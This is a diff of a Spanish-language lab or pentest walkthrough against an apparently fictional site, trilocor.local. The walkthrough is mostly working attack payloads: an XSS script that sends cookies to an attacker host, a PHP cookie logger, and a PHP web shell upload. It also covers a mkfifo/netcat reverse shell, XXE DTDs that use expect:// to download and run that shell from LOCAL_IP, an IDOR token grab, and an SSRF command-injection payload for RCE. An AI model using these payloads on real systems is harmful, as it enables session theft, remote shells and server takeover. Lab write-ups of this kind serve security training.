@@ -26,13 +26,11 @@ Enviar un script malicioso para robar cookies y usarlas para entrar al panel de 
 - **Parámetros vulnerables:** `name`, `company_title`, `testimonial`
 
 **Paso 1 — Crear `script.js`:**
-
 ```javascript
 new Image().src='http://LOCAL_IP/get_cookie.php?c='+document.cookie
 ```
 
 **Paso 2 — Crear `get_cookie.php`** (registra las cookies recibidas):
-
 ```php
 <?php
 if (isset($_GET['c'])) {
@@ -48,7 +46,6 @@ if (isset($_GET['c'])) {
 ```
 
 **Paso 3 — Levantar el servidor PHP** y enviar el payload en cualquiera de los parámetros vulnerables:
-
 ```bash
 sudo php -S 0.0.0.0:80
 ```
@@ -74,7 +71,6 @@ Content-Type: image/jpeg
 ```
 
 Dentro del plugin **Filester**, cambiar la extensión de la imagen a `.php`. Visitar su URL y ejecutar el shell:
-
 ```
 www.trilocor.local/wp-content/uploads/yourshell.php?cmd=id
 ```
@@ -180,33 +176,28 @@ XXE en dos etapas: primero subir y codificar un reverse shell, luego ejecutar el
 - **Parámetro vulnerable:** `uploadFile`
 
 **Archivo `rev_shell.sh`:**
-
 ```bash
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc LOCAL_IP 443 >/tmp/f
 ```
 
 **Archivo `xxe.dtd`** (codifica y guarda el `rev_shell.sh` en la víctima):
-
 ```dtd
 <!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=expect://curl$IFS'http://LOCAL_IP:8000/rev_shell.sh'$IFS-o$IFS/tmp/shell.sh">
 <!ENTITY % oob "<!ENTITY content SYSTEM 'http://LOCAL_IP:8000/?content=%file;'>">
 ```
 
 **Archivo `rev_exec.dtd`** (ejecuta el `rev_shell.sh` guardado):
-
 ```dtd
 <!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=expect://bash$IFS/tmp/rev_shell.sh">
 <!ENTITY % oob "<!ENTITY content SYSTEM'http://LOCAL_IP:8000/?content=%file;'>">
 ```
 
 **Levantar el servidor local:**
-
 ```bash
 sudo php -S 0.0.0.0:8000
 ```
 
 **Etapa 1 — Subir/codificar** — enviar a `POST /admin/upload` dentro de `uploadFile`:
-
 ```xml
 <?xml version="1.0" standalone="yes"?>
 <!DOCTYPE svg [<!ELEMENT svg ANY ><!ENTITY % remote SYSTEM 'http://LOCAL_IP:8000/xxe.dtd'>%remote;%oob;]>
@@ -214,7 +205,6 @@ sudo php -S 0.0.0.0:8000
 ```
 
 **Etapa 2 — Ejecutar** — poner el listener y enviar el segundo payload al mismo endpoint:
-
 ```bash
 nc -lvnp 443
 ```
@@ -237,7 +227,6 @@ Cambiar los valores de `uid` y `username` para encontrar el token del administra
 - **Parámetros vulnerables:** `uid`, `username`
 
 Modificar el body en `/api/tokens`:
-
 ```json
 {"uid":"1","username":"administrator"}
 ```
@@ -251,13 +240,12 @@ Modificar el body en `/api/tokens`:
 El archivo `api.js` revela los endpoints de la API: `/api/admin` y `/api/admin/healthcheck`. El `healthcheck` permite **leer el código fuente de las URLs** que le pasás. Tras fuzzear los puertos de la URL interna, se encuentra el **puerto 9090 abierto**.
 
 **Descubrir parámetros** — con el parámetro `help` aparecen `install&package`:
-
 ```json
 {"uuid":"admin_uuid","url":"127.0.0.1:9090?help"}
 {"uuid":"admin_uuid","url":"127.0.0.1:9090?install&package"}
 ```
 
-`install&package` se explota rompiendo con `=$%26` para conseguir RCE:
+`install&package` se explota rompiendo con =$%26 para conseguir RCE:
 
 ```json
 {"uuid":"admin_uuid","url":"127.0.0.1:9090?install&package=$%26/bin/ls%20/"}
